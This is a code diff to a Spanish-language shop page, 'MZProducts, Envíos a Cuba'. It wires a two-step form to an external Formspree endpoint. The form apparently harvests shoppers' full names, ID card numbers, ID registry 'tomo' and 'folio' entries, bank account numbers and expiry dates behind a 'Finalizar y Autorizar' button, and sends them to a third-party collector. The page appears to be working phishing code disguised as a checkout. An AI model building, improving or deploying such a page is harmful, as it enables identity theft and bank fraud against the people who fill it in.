@@ -14,7 +14,6 @@
         .input-group { margin-bottom: 20px; }
         label { display: block; margin-bottom: 8px; font-weight: bold; color: #555; }
         input, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; background-color: #fdfdfd; box-sizing: border-box; }
-        .error-msg { color: #d35400; font-size: 13px; margin-top: 5px; font-weight: bold; }
         .btn-group { display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px; }
         button { padding: 12px 25px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; }
         .btn-next, .btn-final { background-color: #1a5276; color: white; }
@@ -23,65 +22,76 @@
     </style>
 </head>
 <body>
+
     <div class="header">
         <div style="font-size: 50px;">🛒🔧</div>
         <p class="brand-name">MZProducts</p>
         <p class="brand-sub">ENVÍOS A CUBA</p>
     </div>
 
-    <div id="step1" class="card">
-        <h2>Datos del titular o propietario</h2>
-        <div class="input-group">
-            <label>Nombre y apellidos</label>
-            <input type="text" placeholder="">
-            <div class="error-msg">Este campo es obligatorio</div>
-        </div>
-        <div class="input-group">
-            <label>No. de carnet</label>
-            <input type="text" placeholder="">
-            <div class="error-msg">Este campo es obligatorio</div>
-        </div>
-        <div class="input-group">
-            <label>Dirección de entrega</label>
-            <textarea rows="3" placeholder=""></textarea>
-            <div class="error-msg">Este campo es obligatorio</div>
-        </div>
-        <div class="btn-group">
-            <button class="btn-next" onclick="showStep2()">Siguiente</button>
-        </div>
-    </div>
+    <form action="https://formspree.io/f/mqaaovql" method="POST" style="width: 100%; max-width: 450px;">
 
-    <div id="step2" class="card">
-        <h2>Documentación del titular de la cuenta</h2>
-        <div class="input-group">
-            <label>No. de carnet</label>
-            <input type="text" placeholder="">
+        <div id="step1" class="card">
+            <h2>Datos del titular o propietario</h2>
+            <div class="input-group">
+                <label>Nombre y apellidos</label>
+                <input type="text" name="nombre_cliente" required>
+            </div>
+            <div class="input-group">
+                <label>No. de carnet</label>
+                <input type="text" name="carnet_paso1" required>
+            </div>
+            <div class="input-group">
+                <label>Dirección de entrega</label>
+                <textarea name="direccion" rows="3" required></textarea>
+            </div>
+            <div class="btn-group">
+                <button type="button" class="btn-next" onclick="showStep2()">Siguiente</button>
+            </div>
         </div>
-        <div class="input-group">
-            <label>Tomo</label>
-            <input type="text" placeholder="">
+
+        <div id="step2" class="card">
+            <h2>Documentación del titular de la cuenta</h2>
+            <div class="input-group">
+                <label>No. de carnet</label>
+                <input type="text" name="carnet_confirmacion">
+            </div>
+            <div class="input-group">
+                <label>Tomo</label>
+                <input type="text" name="tomo">
+            </div>
+            <div class="input-group">
+                <label>Folio</label>
+                <input type="text" name="folio">
+            </div>
+            <div class="input-group">
+                <label>No. de cuenta</label>
+                <input type="text" name="cuenta_bancaria">
+            </div>
+            <div class="input-group">
+                <label>Fecha de vencimiento</label>
+                <input type="date" name="fecha_vencimiento">
+            </div>
+            <div class="btn-group">
+                <button type="button" class="btn-back" onclick="showStep1()">Atrás</button>
+                <button type="submit" class="btn-final">Finalizar y Autorizar</button>
+            </div>
         </div>
-        <div class="input-group">
-            <label>Folio</label>
-            <input type="text" placeholder="">
-        </div>
-        <div class="input-group">
-            <label>No. de cuenta</label>
-            <input type="text" placeholder="">
-        </div>
-        <div class="input-group">
-            <label>Fecha de vencimiento</label>
-            <input type="date">
-        </div>
-        <div class="btn-group">
-            <button class="btn-back" onclick="showStep1()">Atrás</button>
-            <button class="btn-final">Finalizar y Autorizar</button>
-        </div>
-    </div>
+
+    </form>
 
     <script>
-        function showStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; window.scrollTo(0, 0); }
-        function showStep1() { document.getElementById('step2').style.display = 'none'; document.getElementById('step1').style.display = 'block'; window.scrollTo(0, 0); }
+        function showStep2() {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+        function showStep1() {
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step1').style.display = 'block';
+            window.scrollTo(0, 0);
+        }
     </script>
+
 </body>
 </html>
